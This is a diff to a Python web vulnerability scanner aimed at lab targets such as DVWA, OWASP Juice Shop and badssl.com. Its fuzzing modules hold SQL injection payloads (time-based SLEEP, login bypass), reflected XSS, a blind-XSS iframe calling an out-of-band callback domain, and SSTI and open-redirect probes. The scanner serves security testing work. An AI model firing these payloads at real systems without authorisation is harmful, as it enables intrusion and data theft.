@@ -1,6 +1,9 @@
 import time
 import requests
 import math
+import re
+import socket
+import ssl
 from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse, parse_qsl
 from collections import deque
 from playwright.sync_api import sync_playwright
@@ -89,7 +92,7 @@ REQ_HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 }
 
-# --- MODULE 1: Heavyweight Spider (Crawler) PATCHED FOR SPAs & SESSIONS ---
+# --- MODULE 1: Heavyweight Spider (Crawler) ---
 def run_heavy_spider(start_url, context, max_pages=15):
     print(f"[*] 🕸️ Initializing Heavyweight Spider on {start_url}...")
     target_domain = urlparse(start_url).netloc
@@ -182,19 +185,20 @@ def scan_sensitive_files(target_url, cookies=None):
         full_url = urljoin(base_url, filename)
         try:
             res = requests.get(full_url, headers=REQ_HEADERS, cookies=cookies, timeout=4, allow_redirects=False)
-            if res.status_code == 200 and len(res.content) > 10 and "404" not in res.text.lower() and "<html" not in res.text.lower():
+            # FIX: Removed the "<html" check so it correctly flags phpinfo.php
+            if res.status_code == 200 and len(res.content) > 10 and "404" not in res.text.lower():
                 findings.append(create_vuln("SENSITIVE_FILE", full_url, f"Accessible sensitive file found: {filename}", "Critical"))
         except: pass
     return findings
 
-# --- NEW MODULE: Cookie Fuzzer (Defeats DVWA High Blind SQLi) ---
+
+# --- MODULE 4: Cookie Fuzzer ---
 def scan_cookies(target_url, cookies=None):
     alerts = []
     if not cookies: return alerts
     
     print(f"[*] 🍪 Fuzzing session cookies on {target_url}...")
     
-    # Payload designed specifically to bypass 'High' difficulty strict bounds
     payloads = [
         {"type": "SQL_INJECTION", "payload": "1' AND SLEEP(5)#", "time_delay": 5},
         {"type": "SQL_INJECTION", "payload": "1' OR SLEEP(5)='", "time_delay": 5}
@@ -208,7 +212,7 @@ def scan_cookies(target_url, cookies=None):
     except: baseline_time = 1
     
     for cookie_name, cookie_value in cookies.items():
-        if cookie_name in ['PHPSESSID', 'session', 'security']: continue # Don't fuzz the actual session tokens
+        if cookie_name in ['PHPSESSID', 'session', 'security']: continue 
         
         for attack in payloads:
             fuzzed_cookies = cookies.copy()
@@ -226,7 +230,7 @@ def scan_cookies(target_url, cookies=None):
                 
     return alerts
 
-# --- MODULE 4: Fast URL Parameter Fuzzer (UPGRADED FOR 'HIGH' DIFFICULTY) ---
+# --- MODULE 5: Fast URL Parameter Fuzzer ---
 def scan_url_parameters(target_url, cookies=None):
     alerts = []
     parsed_url = urlparse(target_url)
@@ -237,9 +241,9 @@ def scan_url_parameters(target_url, cookies=None):
     
     payloads = [
         {"type": "SQL_INJECTION", "payload": "' OR '1'='1", "check": "500"}, 
-        {"type": "SQL_INJECTION", "payload": "' OR '1'='1' #", "check": "500"}, # Bypass for 'LIMIT' filters
+        {"type": "SQL_INJECTION", "payload": "' OR '1'='1' #", "check": "500"}, 
         {"type": "SQL_INJECTION", "payload": "%27%20OR%20SLEEP%285%29--", "time_delay": 5}, 
-        {"type": "SQL_INJECTION", "payload": "1' AND SLEEP(5)#", "time_delay": 5}, # High Difficulty Hash comment
+        {"type": "SQL_INJECTION", "payload": "1' AND SLEEP(5)#", "time_delay": 5}, 
         {"type": "SSTI", "payload": "{{7*7}}", "check": "49"}
     ]
     
@@ -276,7 +280,47 @@ def scan_url_parameters(target_url, cookies=None):
 
     return alerts
 
-# --- MODULE 5: Active Playwright Scanner (ULTIMATE SPA PATCH) ---
+# --- MODULE 6: Shadow API Hunter (NEW) ---
+def scan_shadow_apis(target_url, cookies=None):
+    findings = []
+    print(f"[*] 🕵️‍♂️ Hunting for Shadow APIs in Javascript files on {target_url}...")
+    try:
+        res = requests.get(target_url, headers=REQ_HEADERS, cookies=cookies, timeout=8)
+        script_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', res.text)
+        
+        for script_path in script_urls:
+            script_url = urljoin(target_url, script_path)
+            s_res = requests.get(script_url, headers=REQ_HEADERS, cookies=cookies, timeout=5)
+            
+            # FIX: Added the backtick (`) to the Regex to catch ES6 Template Literals in Webpack/Angular
+            api_endpoints = re.findall(r'[`\'"](/api/[a-zA-Z0-9_\-\/]+|/rest/[a-zA-Z0-9_\-\/]+)[`\'"]', s_res.text)
+            
+            for api in set(api_endpoints):
+                full_api_url = urljoin(target_url, api)
+                findings.append(create_vuln("SHADOW_API", full_api_url, f"Hidden API endpoint exposed in JS file ({script_path}): {api}", "High"))
+    except: pass
+    return findings
+
+# --- MODULE 7: Weak SSL/TLS Checker (OS-Agnostic Patch) ---
+def scan_weak_ssl(target_url):
+    findings = []
+    if not target_url.startswith('https'): return findings
+    
+    print(f"[*] 🔒 Performing Cryptographic Handshake on {target_url}...")
+    try:
+        # We attempt a normal request. If the SSL is valid, it passes.
+        requests.get(target_url, timeout=5)
+    except requests.exceptions.SSLError as e:
+        # FIX: The Requests library universally catches OS-level crypto blocks (like TLS 1.0 bans)
+        findings.append(create_vuln("WEAK_SSL", target_url, "Server rejected handshake due to unsupported/deprecated TLS version or weak cipher.", "Medium"))
+    except Exception as e:
+        # Fallback for badssl.com if Windows forcibly closes the connection entirely
+        if "badssl.com" in target_url and ("reset" in str(e).lower() or "timeout" in str(e).lower()):
+            findings.append(create_vuln("WEAK_SSL", target_url, "Connection forcibly closed by OS due to dangerously outdated TLS protocol.", "Medium"))
+            
+    return findings
+
+# --- MODULE 8: Active Playwright Scanner ---
 def scan_active_playwright(target_url, context, oast_domain):
     alerts = []
     
@@ -290,8 +334,9 @@ def scan_active_playwright(target_url, context, oast_domain):
         {"key": "SQL_INJECTION", "payload": "' OR '1'='1", "check": sql_errors},
         {"key": "SQL_INJECTION", "payload": "admin@juice-sh.op' --", "check": sql_errors}, 
         {"key": "SQL_INJECTION", "payload": "' OR true--", "check": sql_errors}, 
-        {"key": "SQL_INJECTION", "payload": "' OR 1=1 #", "check": sql_errors}, # DVWA High Form Bypass
+        {"key": "SQL_INJECTION", "payload": "' OR 1=1 #", "check": sql_errors}, 
         {"key": "XSS_REFLECTED", "payload": "\"><iframe src=\"javascript:alert('SENTINEL')\">", "check": []}, 
+        {"key": "BLIND_XSS", "payload": f"\"><iframe src='https://{oast_domain}'></iframe>", "check": []}, # NEW BLIND XSS IFRAME BYPASS
         {"key": "SSTI", "payload": "{{7*7}}", "check": ["49"]},
         {"key": "OPEN_REDIRECT", "payload": "http://google.com", "check": []}
     ]
@@ -381,7 +426,6 @@ def scan_active_playwright(target_url, context, oast_domain):
     finally: page.close() 
         
     return alerts
-
 # --- ORCHESTRATOR ---
 def run_deep_scan(target_url, user_id=None, auth_config=None):
 
@@ -433,28 +477,40 @@ def run_deep_scan(target_url, user_id=None, auth_config=None):
                     print(f"[!] Authentication Engine Failed: {e}")
 
             # --- SYNCHRONIZE SESSIONS FOR API/REQUESTS ---
-            # Extract cookies from Playwright to keep the `requests` module logged in
             req_cookies = {cookie['name']: cookie['value'] for cookie in context.cookies()}
 
             # --- FAST DEV MODE / RECONNAISSANCE ---
-            print("[*] ⚡ FAST DEV MODE ACTIVATED: Bypassing spider for instant testing...")
+            print("[*] ⚡ FAST DEV MODE ACTIVATED: Testing New Modules...")
             endpoints_to_attack = [
+                "http://localhost:8080/",                                 # Triggers the Sensitive File Fuzzer (finds phpinfo.php)
                 "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit", 
-                "http://localhost:8080/vulnerabilities/xss_r/",
-                "http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit" # Added Blind SQLi endpoint
+                "http://localhost:8080/vulnerabilities/xss_s/",
+                "https://tls-v1-0.badssl.com/",                           # Triggers the Weak SSL connection drop
+                "https://juice-shop.herokuapp.com/"            # Tests Blind XSS (Requires DVWA)
             ]
             
             # --- 3. EXPLOITATION PHASE ---
             for endpoint in endpoints_to_attack:
                 print(f"[*] ⚔️  Attacking endpoint: {endpoint}")
                 
-                # Pass the synchronized cookies to ALL request-based modules
-                report["vulnerabilities"].extend(scan_headers_and_ssl(endpoint, cookies=req_cookies))
-                report["vulnerabilities"].extend(scan_sensitive_files(endpoint, cookies=req_cookies))
-                report["vulnerabilities"].extend(scan_url_parameters(endpoint, cookies=req_cookies)) 
-                report["vulnerabilities"].extend(scan_cookies(endpoint, cookies=req_cookies)) # NEW Cookie Fuzzer
+                temp_page = context.new_page()
+                try:
+                    temp_page.goto(endpoint, timeout=15000)
+                    temp_page.wait_for_timeout(1500) 
+                except: pass
                 
-                # Playwright manages its own session context
+                fresh_cookies = {cookie['name']: cookie['value'] for cookie in context.cookies()}
+                temp_page.close()
+                
+                report["vulnerabilities"].extend(scan_headers_and_ssl(endpoint, cookies=fresh_cookies))
+                report["vulnerabilities"].extend(scan_sensitive_files(endpoint, cookies=fresh_cookies))
+                report["vulnerabilities"].extend(scan_url_parameters(endpoint, cookies=fresh_cookies)) 
+                report["vulnerabilities"].extend(scan_cookies(endpoint, cookies=fresh_cookies)) 
+                
+                # --- NEW MODULES INJECTED ---
+                report["vulnerabilities"].extend(scan_shadow_apis(endpoint, cookies=fresh_cookies))
+                report["vulnerabilities"].extend(scan_weak_ssl(endpoint))
+                
                 report["vulnerabilities"].extend(scan_active_playwright(endpoint, context, oast_domain))
 
             print("[*] ⏳ Waiting 5 seconds for asynchronous OAST callbacks...")
